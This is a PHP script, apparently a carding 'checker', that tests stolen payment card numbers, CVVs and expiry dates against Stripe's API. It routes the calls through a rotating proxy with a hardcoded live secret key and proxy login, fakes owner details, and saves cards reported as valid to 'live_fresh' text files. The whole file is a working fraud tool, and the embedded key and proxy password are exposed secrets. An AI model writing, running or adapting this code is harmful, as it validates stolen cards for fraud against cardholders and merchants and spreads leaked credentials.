<html>
<head>
<link rel='stylesheet' type='text/css' href='assets/style.css' />
</head>
</html>
<?php
recheck:
error_reporting(0);
ini_set('display_errors', 0);
require_once './libs/Curl/CurlX.php';
require './libs/init.php';

$sk = 'sk_live_PjLQjnDMpX1uofipsi7ZiAgF';
$curl = new CurlX;
curl_setopt($curl, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($curl, CURLOPT_PROXYUSERPWD, "jluqzwsq-rotate:hxyv1cgdxffz");
$header = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'Authorization: Bearer '.$sk.'');

$response = $curl->post($url = 'https://api.stripe.com/v1/sources', $data = 'type=card&amount=100&currency=usd&owner[name]='.$firstname.'+'.$lastname.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$zip.'&owner[address][country]=US&owner[email]='.$firstname.'.'.$lastname.'77%40gmail.com&owner[phone]=131'.$cvv.'3'.$cvv.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'', $header);
header('content-length: '.strlen($data), true);
echo $response;
$resp = json_decode($response, true);
$token = $resp['id'];
$error = $resp['error'];
if (isset($error)) {
	$code = $error['code'];
	$dcode = $error['decline_code'];
	$msg = $error['message'];
	if (isset($dcode)) {
		$errorcode = $dcode;
		echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$errorcode</font><br>";
		die();
	}else{
		$errorcode = $code;
		echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$errorcode</font><br>";
	die();
	}
}elseif (empty($response)) {
    goto recheck;
}else{

$curl2 = new CurlX;
curl_setopt($curl2, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($curl2, CURLOPT_PROXYUSERPWD, "jluqzwsq-rotate:hxyv1cgdxffz");
$header2 = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'Authorization: Bearer '.$sk.'');
$response2 = $curl2->post($url2 = 'https://api.stripe.com/v1/customers', $data2 = 'description=Virtual Product&source='.$token.'', $header2);
echo $response2;
header('content-length: '.strlen($data2), true);
$code2 = getStr($response2, '"code": "','",');
$dcode2 = getStr($response2, '"decline_code": "','",');

if (strpos($response2, '"cvc_check": "pass"')) {
    fwrite(fopen('live_fresh.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-success'>Aprovada</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-success'>CVV Matched</font><br>";
    die();
}elseif (strpos($response, '"cvc_check": "pass"')) {
    fwrite(fopen('live_fresh.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-success'>Aprovada</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-success'>CVV Matched</font><br>";
    die();
}
elseif  (preg_match('/\bincorrect_zip\b/', $response2)) {
    fwrite(fopen('live_fresh.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-success'>Aprovada</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-success'>CVV Matched Incorrect Zip</font><br>";
    die();   
  }
elseif  (preg_match('/\bincorrect_zip\b/', $response)) {
    fwrite(fopen('live_fresh.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-success'>Aprovada</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-success'>CVV Matched Incorrect Zip</font><br>";
    die();   
  }elseif (strpos($response2, '"cvc_check": "unchecked"')) {
    echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>Stripe Key Fucked !!</font><br>";
    die();
}elseif (strpos($response2, '"cvc_check": "unavailable"')) {
    echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>CVC Unavailable</font><br>";
    die();
}elseif (strpos($response2, '"cvc_check": "fail"')) {
    fwrite(fopen('live_fresh_ccn.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-danger'>Approved</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>CVC Failed</font><br>";
    die();
}elseif (strpos($response2, 'incorrect_cvc')) {
    fwrite(fopen('live_fresh_ccn.txt', 'a'), $lista."\r\n");
    echo "<font class='badge badge-danger'>Approved</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>CVV Missmatch</font><br>";
    die();
}elseif (empty($response2)) {
    goto recheck;
}elseif (empty($dcode2)) {
    echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$code2</font><br>";
}else{
	echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$dcode2</font><br>";
	die();
}
}
?>